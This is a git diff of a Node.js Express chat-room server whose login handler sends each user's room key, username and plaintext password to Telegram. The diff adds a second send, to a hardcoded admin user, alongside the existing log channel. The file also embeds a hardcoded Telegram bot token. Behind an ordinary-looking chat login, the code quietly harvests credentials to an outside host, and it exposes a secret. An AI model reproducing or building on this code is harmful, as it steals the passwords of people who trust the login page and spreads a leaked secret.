@@ -4,9 +4,9 @@ const { v4: uuidv4 } = require('uuid');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram bot setup
 const BOT_TOKEN = '8157449994:AAENXtv_w_gfBz36ZVD_DKLETHzYzpEvAAM';
-const CHANNEL_ID = '-1002846991732';
+const LOG_CHANNEL_ID = '-1002846991732';
+const ADMIN_USER_ID = '7307633923';
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 app.use(express.json());
@@ -46,25 +46,26 @@ app.post('/login', async (req, res) => {
   const room = rooms[key];
   if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
 
-  const loginText = `Room: ${key}\nUsername: ${username}\nPassword: ${password}`;
+  const loginText = `🔐 New Login\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;
 
   try {
-    // Check past messages for this login
     const updates = await axios.get(`${TELEGRAM_API}/getUpdates`);
-    const found = updates.data.result.find(u => {
+    const used = updates.data.result.some(u => {
       const text = u.message?.text || '';
-      return text.includes(`Room: ${key}`) &&
-             text.includes(`Username: ${username}`) &&
-             text.includes(`Password: ${password}`);
+      return text.includes(`Username: ${username}`);
     });
 
-    if (!found) {
-      // First time login, send to Telegram
-      await axios.post(`${TELEGRAM_API}/sendMessage`, {
-        chat_id: CHANNEL_ID,
-        text: loginText
-      });
-    }
+    if (used) return res.json({ success: false, message: 'Username already taken' });
+
+    await axios.post(`${TELEGRAM_API}/sendMessage`, {
+      chat_id: ADMIN_USER_ID,
+      text: loginText
+    });
+
+    await axios.post(`${TELEGRAM_API}/sendMessage`, {
+      chat_id: LOG_CHANNEL_ID,
+      text: loginText
+    });
 
     res.json({
       success: true,
@@ -72,7 +73,7 @@ app.post('/login', async (req, res) => {
       history: room.messages.map(m => `${m.user}: ${m.message}`)
     });
   } catch (err) {
-    console.error('Telegram login check failed:', err.message);
+    console.error('Telegram error:', err.message);
     res.json({ success: false });
   }
 });
@@ -86,7 +87,6 @@ app.post('/send-message', (req, res) => {
   room.messages.push(entry);
   const formatted = `${user}: ${message}`;
   room.clients.forEach(c => c.write(`data: ${formatted}\n\n`));
-
   res.end();
 });
 
@@ -108,4 +108,4 @@ app.get('/stream/:key', (req, res) => {
   });
 });
 
-app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
+app.listen(PORT, () => console.log(`✅ Server running on http://localhost:${PORT}`));
